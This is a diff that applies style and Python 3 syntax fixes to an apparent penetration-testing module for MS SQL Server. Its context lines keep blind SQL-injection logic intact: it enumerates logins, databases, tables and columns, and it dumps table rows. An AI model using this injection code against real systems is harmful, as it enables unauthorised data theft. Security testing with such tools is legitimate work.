@@ -9,13 +9,12 @@ from plugins.attack.db.dbDriver import dbDriver as Common
 
 
 class MSSQLServerMap(Common):
-    __banner                 = ""
-    __currentDb              = ""
-    __fingerprint            = []
-    __cachedDbs              = []
-    __cachedTables           = {}
-    __cachedColumns          = {}
-
+    __banner = ""
+    __currentDb = ""
+    __fingerprint = []
+    __cachedDbs = []
+    __cachedTables = {}
+    __cachedColumns = {}
 
     def unescape(self, expression):
         while True:
@@ -27,7 +26,7 @@ class MSSQLServerMap(Common):
             index = expression[firstIndex:].find("'")
 
             if index == -1:
-                raise Exception, "Unenclosed ' in '%s'" % expression
+                raise Exception("Unenclosed ' in '%s'" % expression)
 
             lastIndex = firstIndex + index
             old = "'%s'" % expression[firstIndex:lastIndex]
@@ -42,7 +41,6 @@ class MSSQLServerMap(Common):
             expression = expression.replace(old, unescaped)
 
         return expression
-
 
     def createStm(self):
         if self.args.injectionMethod == "numeric":
@@ -72,9 +70,11 @@ class MSSQLServerMap(Common):
         value = "active fingerprint: %s" % actVer
 
         if self.__banner:
-            banVer = re.search("Microsoft SQL Server\s+([\d\.]+) - ([\d\.]+)", self.__banner)
+            banVer = re.search(
+                "Microsoft SQL Server\s+([\d\.]+) - ([\d\.]+)", self.__banner)
             if banVer:
-                release = "Microsoft SQL Server %s, version" % banVer.groups()[0]
+                release = "Microsoft SQL Server %s, version" % banVer.groups(
+                )[0]
                 banVer = banVer.groups()[1]
                 banVer = self.parseFp(release, [banVer])
 
@@ -82,7 +82,6 @@ class MSSQLServerMap(Common):
             value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)
 
         return value
-
 
     def getBanner(self):
         logMsg = "fetching banner"
@@ -93,13 +92,11 @@ class MSSQLServerMap(Common):
 
         return self.__banner
 
-
     def getCurrentUser(self):
         logMsg = "fetching current user"
         self.log(logMsg)
 
         return self.get_value("USER_NAME()")
-
 
     def getCurrentDb(self):
         logMsg = "fetching current database"
@@ -110,18 +107,17 @@ class MSSQLServerMap(Common):
         else:
             return self.get_value("DB_NAME()")
 
-
     def getUsers(self):
         logMsg = "fetching number of database users"
         self.log(logMsg)
 
-        stm  = "SELECT STR(COUNT(name)) FROM master..syslogins"
+        stm = "SELECT STR(COUNT(name)) FROM master..syslogins"
 
         count = self.get_value(stm)
 
         if not len(count) or count == "0":
             errMsg = "unable to retrieve the number of database users"
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         logMsg = "fetching database users"
         self.log(logMsg)
@@ -129,7 +125,7 @@ class MSSQLServerMap(Common):
         users = []
 
         for index in range(int(count)):
-            stm  = "SELECT TOP 1 name FROM master..syslogins "
+            stm = "SELECT TOP 1 name FROM master..syslogins "
             stm += "WHERE name NOT IN (SELECT TOP %d name " % index
             stm += "FROM master..syslogins ORDER BY name) "
             stm += "ORDER BY name"
@@ -138,10 +134,9 @@ class MSSQLServerMap(Common):
             users.append(user)
 
         if not users:
-            raise Exception, "unable to retrieve the database users"
+            raise Exception("unable to retrieve the database users")
 
         return users
-
 
     def getDbs(self):
         logMsg = "fetching number of databases"
@@ -153,8 +148,7 @@ class MSSQLServerMap(Common):
 
         if not len(count) or count == "0":
             errMsg = "unable to retrieve the number of databases"
-            raise Exception, errMsg
-
+            raise Exception(errMsg)
 
         logMsg = "fetching database names"
         self.log(logMsg)
@@ -162,7 +156,7 @@ class MSSQLServerMap(Common):
         dbs = []
 
         for index in range(int(count)):
-            stm  = "SELECT TOP 1 name FROM master..sysdatabases "
+            stm = "SELECT TOP 1 name FROM master..sysdatabases "
             stm += "WHERE name NOT IN (SELECT TOP %d name " % index
             stm += "FROM master..sysdatabases ORDER BY name) "
             stm += "ORDER BY name"
@@ -174,10 +168,9 @@ class MSSQLServerMap(Common):
             self.__cachedDbs = dbs
         else:
             errMsg = "unable to retrieve the database names"
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         return dbs
-
 
     def getTables(self):
         if not self.args.db:
@@ -197,14 +190,14 @@ class MSSQLServerMap(Common):
             logMsg = "fetching number of tables for database '%s'" % db
             self.log(logMsg)
 
-            stm  = "SELECT STR(COUNT(table_name)) FROM "
+            stm = "SELECT STR(COUNT(table_name)) FROM "
             stm += "%s.information_schema.tables " % db
             stm += "WHERE table_type = 'BASE TABLE'"
 
             count = self.get_value(stm)
 
             if not len(count) or count == "0":
-                warnMsg  = "unable to retrieve the number of "
+                warnMsg = "unable to retrieve the number of "
                 warnMsg += "tables for database '%s'" % db
                 self.warn(warnMsg)
 
@@ -216,7 +209,7 @@ class MSSQLServerMap(Common):
             tables = []
 
             for index in range(int(count)):
-                stm  = "SELECT TOP 1 table_name FROM "
+                stm = "SELECT TOP 1 table_name FROM "
                 stm += "%s.information_schema.tables WHERE " % db
                 stm += "table_type = 'BASE TABLE' AND table_name "
                 stm += "NOT IN (SELECT TOP %d table_name " % index
@@ -230,38 +223,37 @@ class MSSQLServerMap(Common):
             if tables:
                 dbTables[db] = tables
             else:
-                warnMsg  = "unable to retrieve the tables "
+                warnMsg = "unable to retrieve the tables "
                 warnMsg += "for database '%s'" % db
                 self.warn(warnMsg)
 
         if dbTables:
             self.__cachedTables = dbTables
         elif not self.args.db:
-            errMsg  = "unable to retrieve the tables for any database"
-            raise Exception, errMsg
+            errMsg = "unable to retrieve the tables for any database"
+            raise Exception(errMsg)
 
         return dbTables
-
 
     def getColumns(self):
         if not self.args.tbl:
             errMsg = "missing table parameter"
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         if "." in self.args.tbl:
             self.args.db, self.args.tbl = self.args.tbl.split(".")
 
         if not self.args.db:
-            errMsg  = "missing database parameter which is "
+            errMsg = "missing database parameter which is "
             errMsg += "mandatory to get table columns on "
             errMsg += "Microsoft SQL Server module"
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
-        logMsg  = "fetching number of columns for table "
+        logMsg = "fetching number of columns for table "
         logMsg += "'%s' on database '%s'" % (self.args.tbl, self.args.db)
         self.log(logMsg)
 
-        stm  = "SELECT STR(COUNT(column_name)) FROM "
+        stm = "SELECT STR(COUNT(column_name)) FROM "
         stm += "%s.information_schema.columns, " % self.args.db
         stm += "%s.information_schema.tables " % self.args.db
         stm += "WHERE %s.information_schema" % self.args.db
@@ -274,12 +266,12 @@ class MSSQLServerMap(Common):
         count = self.get_value(stm)
 
         if not len(count) or count == "0":
-            errMsg  = "unable to retrieve the number of columns "
+            errMsg = "unable to retrieve the number of columns "
             errMsg += "for table '%s' " % self.args.tbl
             errMsg += "on database '%s'" % self.args.db
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
-        logMsg  = "fetching columns for table '%s' " % self.args.tbl
+        logMsg = "fetching columns for table '%s' " % self.args.tbl
         logMsg += "on database '%s'" % self.args.db
         self.log(logMsg)
 
@@ -288,7 +280,7 @@ class MSSQLServerMap(Common):
         columns = {}
 
         for index in range(int(count)):
-            stm  = "SELECT TOP 1 column_name FROM "
+            stm = "SELECT TOP 1 column_name FROM "
             stm += "%s.information_schema.columns, " % self.args.db
             stm += "%s.information_schema.tables " % self.args.db
             stm += "WHERE %s.information_schema" % self.args.db
@@ -309,7 +301,7 @@ class MSSQLServerMap(Common):
 
             column = self.get_value(stm)
 
-            stm  = "SELECT data_type FROM "
+            stm = "SELECT data_type FROM "
             stm += "%s.information_schema.columns " % self.args.db
             stm += "WHERE %s.information_schema.columns." % self.args.db
             stm += "column_name = '%s' AND " % column
@@ -323,34 +315,33 @@ class MSSQLServerMap(Common):
             table[self.args.tbl] = columns
             tableColumns[self.args.db] = table
         else:
-            errMsg  = "unable to retrieve the columns for "
+            errMsg = "unable to retrieve the columns for "
             errMsg += "table '%s' " % self.args.tbl
             errMsg += "on database '%s'" % self.args.db
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         self.__cachedColumns[self.args.db] = table
 
         return tableColumns
 
-
     def dumpTable(self):
         if not self.args.tbl:
             errMsg = "missing table parameter"
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         if "." in self.args.tbl:
             self.args.db, self.args.tbl = self.args.tbl.split(".")
 
         if not self.args.db:
-            errMsg  = "missing database parameter which is "
+            errMsg = "missing database parameter which is "
             errMsg += "mandatory to get table columns on "
             errMsg += "Microsoft SQL Server module"
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         if not self.__cachedColumns:
             self.__cachedColumns = self.getColumns()
 
-        logMsg  = "fetching number of entries for table "
+        logMsg = "fetching number of entries for table "
         logMsg += "'%s' on database '%s'" % (self.args.tbl, self.args.db)
         self.log(logMsg)
 
@@ -361,10 +352,10 @@ class MSSQLServerMap(Common):
         count = self.get_value(stm)
 
         if not len(count) or count == "0":
-            errMsg  = "unable to retrieve the number of entries "
+            errMsg = "unable to retrieve the number of entries "
             errMsg += "for table '%s' " % self.args.tbl
             errMsg += "on database '%s'" % self.args.db
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         if self.args.col:
             self.args.col = self.args.col.split(',')
@@ -375,7 +366,7 @@ class MSSQLServerMap(Common):
             if self.args.col and column not in self.args.col:
                 continue
 
-            logMsg  = "fetching entries of column '%s' for " % column
+            logMsg = "fetching entries of column '%s' for " % column
             logMsg += "table '%s' " % self.args.tbl
             logMsg += "on database '%s'" % self.args.db
             self.log(logMsg)
@@ -386,7 +377,7 @@ class MSSQLServerMap(Common):
             columnValues[column] = {}
 
             for index in range(int(count)):
-                stm  = "SELECT TOP 1 %s FROM %s " % (column, fromExpr)
+                stm = "SELECT TOP 1 %s FROM %s " % (column, fromExpr)
                 stm += "WHERE %s NOT IN (SELECT TOP %d " % (column, index)
                 stm += "%s FROM %s)" % (column, fromExpr)
                 value = self.get_value(stm)
@@ -414,26 +405,23 @@ class MSSQLServerMap(Common):
 
             columnValues["__infos__"] = infos
         else:
-            errMsg  = "unable to retrieve the entries for "
+            errMsg = "unable to retrieve the entries for "
             errMsg += "table '%s' " % self.args.tbl
             errMsg += "on database '%s'" % self.args.db
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         return columnValues
 
-
     def getFile(self, filename):
-        errMsg  = "Microsoft SQL Server module does "
+        errMsg = "Microsoft SQL Server module does "
         errMsg += "not support file reading"
-        raise Exception, errMsg
-
+        raise Exception(errMsg)
 
     def getExpr(self, expression):
         if self.args.unionUse:
             return self.unionUse(expression)
         else:
             return self.get_value(expression)
-
 
     def checkDbms(self):
         logMsg = "testing Microsoft SQL Server"
@@ -458,7 +446,5 @@ class MSSQLServerMap(Common):
 
             return False
 
-
     def __init__(self, urlOpener, cmpFunction, vuln):
-        Common.__init__( self, urlOpener, cmpFunction, vuln )
-
+        Common.__init__(self, urlOpener, cmpFunction, vuln)
